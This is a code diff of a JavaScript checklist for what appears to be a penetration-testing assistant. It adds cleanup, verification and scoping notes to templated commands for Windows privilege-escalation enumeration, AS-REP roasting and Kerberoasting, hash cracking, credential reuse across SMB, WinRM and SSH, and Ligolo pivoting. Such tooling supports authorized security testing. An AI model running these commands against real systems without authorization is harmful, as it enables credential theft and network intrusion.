           { label: "Writable service binaries", value: "powershell -c \"Get-CimInstance Win32_Service | ? PathName | % { $_.PathName }\"" },
+          { label: "DLL search-path directory ACLs", value: "powershell -NoProfile -Command \"$env:Path -split ';' | Where-Object { $_ } | ForEach-Object { $p=$_.Trim(); if (Test-Path $p) { Write-Host ('=== ' + $p); icacls $p } }\"" },
         ],
       },
       {
@@ -408,9 +536,10 @@ export const CHECKLIST = [
       {
         id: "windows-helper",
         title: "Run one packaged helper if manual checks stall",
+        detail: "Only after the manual checks: locate one preinstalled Kali binary, stage it through the transfer card, verify its checksum, run it once, preserve the output, and remove both helper and output when evidence retention permits.",
         commands: [
           { label: "Find WinPEAS on Kali", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*x64*.exe' -o -iname 'winPEASany.exe' \\) 2>/dev/null" },
-          { label: "Save output", value: "winPEASx64.exe log=console > C:\\Windows\\Temp\\winpeas.txt" },
+          { label: "Save output", stateChange: "target-file", verificationCommand: "powershell -c \"Get-Item 'C:\\Windows\\Temp\\winpeas.txt' | Select-Object FullName,Length\"", cleanup: { required: true, command: "powershell -c \"Remove-Item -Force 'C:\\Windows\\Temp\\winpeas.txt'\"", note: "Remove the helper output only after preserving the required evidence." }, value: "winPEASx64.exe log=console > C:\\Windows\\Temp\\winpeas.txt" },
         ],
       },
     ],
@@ -426,7 +555,8 @@ export const CHECKLIST = [
         title: "Confirm domain DNS and clock",
         commands: [
           { label: "DNS", value: "dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
-          { label: "Sync time from domain controller", value: "sudo timedatectl set-ntp false; sudo net time set -S {{rhost}}" },
+          { label: "Temporarily disable Kali NTP", stateChange: "local-system", cleanup: { required: true, command: "sudo timedatectl set-ntp true", note: "Restore normal Kali time synchronization after Kerberos work." }, verificationCommand: "timedatectl status", value: "sudo timedatectl set-ntp false" },
+          { label: "Sync Kali time from the domain controller", stateChange: "local-system", cleanup: { required: true, command: "sudo timedatectl set-ntp true", note: "Restore normal Kali time synchronization after Kerberos work." }, verificationCommand: "timedatectl status", value: "sudo net time set -S {{rhost}}" },
           { label: "Credential test", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares" },
         ],
       },
@@ -439,6 +569,14 @@ export const CHECKLIST = [
         ],
       },
       {
+        id: "ad-trusts",
+        title: "Enumerate domain trusts",
+        detail: "Query trust objects from Kali with the one selected domain credential. Record direction, type, attributes, and SID before considering any cross-domain path.",
+        commands: [
+          { label: "LDAP trusted-domain objects", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=trustedDomain)' cn trustPartner trustDirection trustType trustAttributes securityIdentifier" },
+        ],
+      },
+      {
         id: "ad-bloodhound-paths",
         title: "Find shortest BloodHound attack paths",
         detail: "Upload the collected ZIP into BloodHound, set BLOODHOUND SOURCE and BLOODHOUND TARGET to object names (for example SVC-ALFRESCO@HTB.LOCAL and DOMAIN ADMINS@HTB.LOCAL), then run one generated command. It saves a Cypher query under the target notes directory; paste that query into Explore > Cypher. Mark compromised principals as owned to use the owned-to-high-value query. Review every returned edge before choosing an abuse command.",
@@ -448,15 +586,15 @@ export const CHECKLIST = [
         id: "ad-roast",
         title: "Check for AS-REP roastable users",
         commands: [
-          { label: "AS-REP tracked users into target loot", value: "users_file=\"{{workspaceRoot}}/{{targetName}}/loot/users.txt\"; loot=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/asrep\"; test -s \"$users_file\" || { echo \"[-] Build the target users file from Findings first\"; exit 1; }; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile \"$users_file\" -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
+          { label: "AS-REP tracked users into target loot", value: "users_file=\"{{workspaceRoot}}/{{targetSlug}}/loot/users.txt\"; loot=\"{{workspaceRoot}}/{{targetSlug}}/loot/kerberos/asrep\"; test -s \"$users_file\" || { echo \"[-] Build the target users file from Findings first\"; exit 1; }; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile \"$users_file\" -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
         ],
       },
       {
         id: "ad-spn-tgs",
         title: "Kerberoast SPN accounts into target loot",
-        detail: "The active credential and every saved account generate separate GetUserSPNs commands. Enumeration output and hashes.txt stay under the current target and credential identity. Printed ticket hashes are parsed into per-user Hashcat and John commands under Credentials. Switch targets with Use in commands to produce that target's paths and DC address.",
+        detail: "Only the credential explicitly selected for this machine generates a GetUserSPNs command. Enumeration output and hashes.txt stay under the current machine and credential identity. Printed ticket hashes are preserved for separate, operator-selected offline cracking commands.",
         commands: [
-          { label: "Inventory saved SPN/TGS loot", value: "root=\"{{workspaceRoot}}/{{targetName}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
+          { label: "Inventory saved SPN/TGS loot", value: "root=\"{{workspaceRoot}}/{{targetSlug}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
         ],
       },
       {
@@ -507,7 +645,7 @@ export const CHECKLIST = [
         id: "creds-identify",
         title: "Identify and normalize captured hashes",
         commands: [
-          { label: "Identify", value: "hashid -m hashes.txt" },
+          { label: "Identify", value: "hashid -m '{{hashesFile}}'" },
           { label: "Show example modes", value: "hashcat --example-hashes | less" },
         ],
       },
@@ -516,16 +654,18 @@ export const CHECKLIST = [
         title: "Try the common Kali wordlist",
         commands: [
           { label: "Prepare rockyou", value: "test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz" },
-          { label: "Hashcat", value: "hashcat -m HASH_MODE hashes.txt /usr/share/wordlists/rockyou.txt --status --session {{targetName}}" },
-          { label: "John", value: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt && john --show hashes.txt" },
+          { label: "Hashcat", value: "hashcat -m {{hashMode}} '{{hashesFile}}' /usr/share/wordlists/rockyou.txt --status --session '{{targetSlug}}'" },
+          { label: "John", value: "john --wordlist=/usr/share/wordlists/rockyou.txt '{{hashesFile}}' && john --show '{{hashesFile}}'" },
         ],
       },
       {
         id: "creds-reuse",
         title: "Test known credentials across the target",
+        detail: "Use only the one credential explicitly selected for this machine. Test one exposed service at a time and record each response; do not turn reuse into an automatic protocol chain.",
         commands: [
-          { label: "Network services", value: "for protocol in smb winrm ssh; do nxc \"$protocol\" {{rhost}} -u '{{user}}' -p '{{password}}' --continue-on-success; done" },
-          { label: "SSH", value: "ssh -o PreferredAuthentications=password '{{user}}@{{rhost}}'" },
+          { label: "SMB authentication", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}'" },
+          { label: "WinRM authentication", value: "nxc winrm {{rhost}} -u '{{user}}' -p '{{password}}'" },
+          { label: "SSH authentication", value: "ssh -o PreferredAuthentications=password '{{user}}@{{rhost}}'" },
         ],
       },
       {
@@ -542,32 +682,14 @@ export const CHECKLIST = [
     id: "pivoting",
     number: "09",
     title: "Pivoting",
-    summary: "Use Ligolo-ng for a routable tunnel; use SSH dynamic forwarding when it is already available.",
+    summary: "Choose one manual topology, confirm every step, and remove routes, listeners, processes, and staged files in reverse order.",
     items: [
       {
-        id: "pivot-ligolo-kali",
-        title: "Prepare the Ligolo interface and proxy",
-        commands: [
-          { label: "Interface", value: "sudo ip tuntap add user $(whoami) mode tun ligolo 2>/dev/null; sudo ip link set ligolo up" },
-          { label: "Find proxy", value: "find /usr/share/ligolo-ng-common-binaries -type f \\( -iname '*proxy*linux*' -o -iname 'proxy' \\)" },
-          { label: "Route subnet", value: "sudo ip route add {{subnet}} dev ligolo" },
-        ],
-      },
-      {
-        id: "pivot-ligolo-agent",
-        title: "Run the agent on the pivot host",
-        commands: [
-          { label: "Find agent", value: "find /usr/share/ligolo-ng-common-binaries -type f -iname '*agent*'" },
-          { label: "Connect", value: "./agent -connect {{lhost}}:11601 -ignore-cert" },
-        ],
-      },
-      {
-        id: "pivot-ssh",
-        title: "Use an SSH SOCKS tunnel when practical",
-        commands: [
-          { label: "Dynamic tunnel", value: "ssh -N -D 127.0.0.1:1080 {{user}}@{{rhost}}" },
-          { label: "Scan through proxy", value: "proxychains4 -q nmap -sT -Pn -n -p 22,80,135,139,443,445,3389,5985 {{subnet}}" },
-        ],
+        id: "pivot-playbook",
+        title: "Run one explicit pivot playbook",
+        detail: "Start with direct access and create tunnel state only after proving it is required. Select one topology below; every command remains a separate, operator-reviewed step with its own RUN ON host, verification, callback direction, and cleanup.",
+        pivotPlaybookSelector: true,
+        commands: [],
       },
     ],
   },
@@ -599,8 +721,8 @@ export const CHECKLIST = [
         id: "proof-artifacts",
         title: "Hash and inventory evidence",
         commands: [
-          { label: "Evidence hashes", value: "find {{workspaceRoot}}/{{targetName}} -type f -print0 | sort -z | xargs -0 sha256sum > {{workspaceRoot}}/{{targetName}}/notes/SHA256SUMS" },
-          { label: "File inventory", value: "find {{workspaceRoot}}/{{targetName}} -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\n' | sort > {{workspaceRoot}}/{{targetName}}/notes/inventory.txt" },
+          { label: "Evidence hashes", value: "find '{{workspaceRoot}}/{{targetSlug}}' -type f -print0 | sort -z | xargs -0 sha256sum > '{{workspaceRoot}}/{{targetSlug}}/notes/SHA256SUMS'" },
+          { label: "File inventory", value: "find '{{workspaceRoot}}/{{targetSlug}}' -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\n' | sort > '{{workspaceRoot}}/{{targetSlug}}/notes/inventory.txt'" },
         ],
       },
       {
@@ -609,12 +731,15 @@ export const CHECKLIST = [
         detail: "List uploaded files, changed configuration, created accounts, services, scheduled tasks, routes, and tunnels.",
         commands: [
           { label: "Stop terminal log", value: "exit" },
-          { label: "Remove Ligolo route", value: "sudo ip route del {{subnet}} dev ligolo; sudo ip link del ligolo" },
+          { label: "Remove an owned Ligolo route", stateChange: "network-route", cleanup: { required: false, command: "", note: "This card is the cleanup action." }, verificationCommand: "ip route show {{internalSubnet}}", value: "sudo ip route del {{internalSubnet}} dev {{pivotInterface}}" },
+          { label: "Delete an owned Ligolo interface", stateChange: "network-route", cleanup: { required: false, command: "", note: "This card is the cleanup action; remove its owned routes first." }, verificationCommand: "ip -br link show {{pivotInterface}}", value: "sudo ip link del {{pivotInterface}}" },
         ],
       },
     ],
   },
 ];
+
+export const CHECKLIST = normalizeChecklist(CHECKLIST_SOURCE);
 
 export const ALL_ITEMS = CHECKLIST.flatMap((phase) =>
   phase.items.map((item) => ({ ...item, phaseId: phase.id, phaseTitle: phase.title })),
